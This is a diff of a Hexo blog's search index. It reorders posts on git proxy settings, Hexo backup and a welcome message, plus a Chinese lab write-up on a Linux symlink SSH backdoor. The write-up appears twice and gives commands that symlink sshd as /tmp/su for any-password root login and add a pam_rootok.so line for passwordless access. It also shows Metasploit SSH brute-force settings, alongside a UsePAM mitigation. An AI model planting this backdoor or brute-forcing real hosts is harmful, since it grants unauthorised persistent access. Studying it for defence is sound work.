@@ -108,18 +108,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[设置github代理]]></title>
-    <url>%2F2019%2F02%2F27%2F%E8%AE%BE%E7%BD%AEgithub%E4%BB%A3%E7%90%86-2019%2F</url>
-    <content type="text"><![CDATA[git下设置网络代理 设置http、https代理12345git config --global https.proxy &apos;http://127.0.0.1:1080&apos;git config --global https.proxy &apos;https://127.0.0.1:1080&apos;走socks5git config --global http.proxy &apos;socks5://127.0.0.1:1080&apos;git config --global https.proxy &apos;socks5://127.0.0.1:1080&apos; 取消 123git config --global --unset http.proxygit config --global --unset https.proxy]]></content>
-      <categories>
-        <category>生活</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-        <tag>GitHub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[如何解决github+Hexo的博客多终端同步问题]]></title>
     <url>%2F2019%2F02%2F27%2Fhexo%E5%A4%87%E4%BB%BD-2019%2F</url>
     <content type="text"><![CDATA[记录一些hexo的备份问题，多终端备份 备份在其中一个终端操作，push本地文件夹Hexo中的必要文件到yourname.github.io的hexo分支上在利用Github+Hexo搭建自己的博客时，新建了一个Hexo的文件夹，并进行相关的配置，这部分主要是将这些配置的文件托管到Github项目的分支上，其中只托管部分用于多终端的同步的文件. 建立.gitignore(可选，建立.gitignore下方添加文件命令只需执行git add .) 1234567.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/ 1234567git init //初始化本地仓库git add source themes scaffolds _config.yml package.json package-lock.json //将必要的文件添加git commit -m "Blog Source Hexo"git branch hexo //新建hexo分支git checkout hexo //切换到hexo分支上git remote add origin git@github.com:yourname/yourname.github.io.git //将本地与Github项目对接git push origin hexo //push到Github项目的hexo分支上 这样你的github项目中就会多出一个Hexo分支，这个就是用于多终端同步关键的部分。 使用12345678git clone -b hexo git@github.com:yourname/yourname.github.io.git //将Github中hexo分支clone到本地cd yourname.github.io //切换到刚刚clone的文件夹内npm install //注意，这里一定要切换到刚刚clone的文件夹内执行，安装必要的所需组件，不用再inithexo new post "new blog name" //新建一个.md文件，并编辑完成自己的博客内容git add source //经测试每次只要更新sorcerer中的文件到Github中即可，因为只是新建了一篇新博客git commit -m "XX"git push origin hexo //更新分支hexo d -g //push更新完分支之后将自己写的博客对接到自己搭的博客网站上，同时同步了Github中的master 不同终端之后的使用 123456git pull origin hexo //先pull完成本地与远端的融合hexo new post " new blog name"git add sourcegit commit -m "XX"git push origin hexohexo d -g]]></content>
@@ -156,15 +144,26 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Linux软连接后门]]></title>
-    <url>%2F2018%2F11%2F09%2FLinux%E8%BD%AF%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8-2018%2F</url>
-    <content type="text"><![CDATA[记录一次Linux软连接后门实验过程，ctf攻防中可用做维持 一、实验过程：1、在靶机执行并查看是否软连接建立完成：12ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345netstat -tunlp | grep 12345 2、在攻击机利用ssh并使用任意密码登陆靶机1ssh root@192.168.86.135 -p 12345 3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录 二、防范1、修改配置文件12vim /etc/ssh/sshd_config UsePAM no 2、重载ssh配置文件1/etc/init.d/sshd reload 3、验证，使用任意密码无法登陆，使用正确密码可以登录 三、延伸1此类ssh后门的核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能,默认的配置文件中出来su，是否还有其他的可利用的配置文件 12345靶机：echo "auth sufficient pam_rootok.so" &gt;&gt; /etc/pam.d/hackercat /etc/pam.d/hackerln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=2333netstat -tunlp | grep 2333 1攻击机： 123实践表明通过软连接文件名指定ssh的pam配置文件为hacker,只要文件中包含&quot;auth sufficient pam_rootok.so&quot;即可无密码登陆最后在etc/pam.d/目录下查找包含pam_rootok.so配置的文件 四、小结1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用2、如果被控主机不允许root登陆可用其他已存在用户登陆3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)4、任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆五、msf相应ssh登陆模块1、批量ssh登录：用msf的ssh登录模块1234567891011121314use auxiliary/scanner/ssh/ssh_loginset rhosts 192.168.10-100.1set username rootset password 123456run/exploitsessions // 查看成功登录的会话，sessions -i // 打开某个会话]]></content>
+    <title><![CDATA[设置github代理]]></title>
+    <url>%2F2019%2F02%2F27%2F%E8%AE%BE%E7%BD%AEgithub%E4%BB%A3%E7%90%86-2019%2F</url>
+    <content type="text"><![CDATA[git下设置网络代理 设置http、https代理12345git config --global https.proxy &apos;http://127.0.0.1:1080&apos;git config --global https.proxy &apos;https://127.0.0.1:1080&apos;走socks5git config --global http.proxy &apos;socks5://127.0.0.1:1080&apos;git config --global https.proxy &apos;socks5://127.0.0.1:1080&apos; 取消 123git config --global --unset http.proxygit config --global --unset https.proxy]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>生活</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
-        <tag>渗透测试</tag>
+        <tag>生活</tag>
+        <tag>GitHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Hello World, Hello Blog]]></title>
+    <url>%2F2018%2F11%2F09%2Fhello-2018%2F</url>
+    <content type="text"><![CDATA[“Yeah It’s on. ” 更新这是第二个博客了github+hexo搭建 ​ 2019年 lem0n 的 Blog 就这么开通了。 2018年11月09日纪念一下~]]></content>
+      <categories>
+        <category>生活</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
       </tags>
   </entry>
   <entry>
@@ -205,14 +204,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Hello World, Hello Blog]]></title>
-    <url>%2F2018%2F11%2F09%2Fhello-2018%2F</url>
-    <content type="text"><![CDATA[“Yeah It’s on. ” 更新这是第二个博客了github+hexo搭建 ​ 2019年 lem0n 的 Blog 就这么开通了。 2018年11月09日纪念一下~]]></content>
+    <title><![CDATA[Linux软连接后门]]></title>
+    <url>%2F2018%2F11%2F09%2FLinux%E8%BD%AF%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8-2018%2F</url>
+    <content type="text"><![CDATA[记录一次Linux软连接后门实验过程，ctf攻防中可用做维持 一、实验过程：1、在靶机执行并查看是否软连接建立完成：12ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345netstat -tunlp | grep 12345 2、在攻击机利用ssh并使用任意密码登陆靶机1ssh root@192.168.86.135 -p 12345 3、如果被控制端的root禁止ssh登录，那么也可以用被控制端的其他用户登录 二、防范1、修改配置文件12vim /etc/ssh/sshd_config UsePAM no 2、重载ssh配置文件1/etc/init.d/sshd reload 3、验证，使用任意密码无法登陆，使用正确密码可以登录 三、延伸1此类ssh后门的核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能,默认的配置文件中出来su，是否还有其他的可利用的配置文件 12345靶机：echo "auth sufficient pam_rootok.so" &gt;&gt; /etc/pam.d/hackercat /etc/pam.d/hackerln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=2333netstat -tunlp | grep 2333 1攻击机： 123实践表明通过软连接文件名指定ssh的pam配置文件为hacker,只要文件中包含&quot;auth sufficient pam_rootok.so&quot;即可无密码登陆最后在etc/pam.d/目录下查找包含pam_rootok.so配置的文件 四、小结1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用2、如果被控主机不允许root登陆可用其他已存在用户登陆3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)4、任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆五、msf相应ssh登陆模块1、批量ssh登录：用msf的ssh登录模块1234567891011121314use auxiliary/scanner/ssh/ssh_loginset rhosts 192.168.10-100.1set username rootset password 123456run/exploitsessions // 查看成功登录的会话，sessions -i // 打开某个会话]]></content>
       <categories>
-        <category>生活</category>
+        <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>生活</tag>
+        <tag>Linux</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
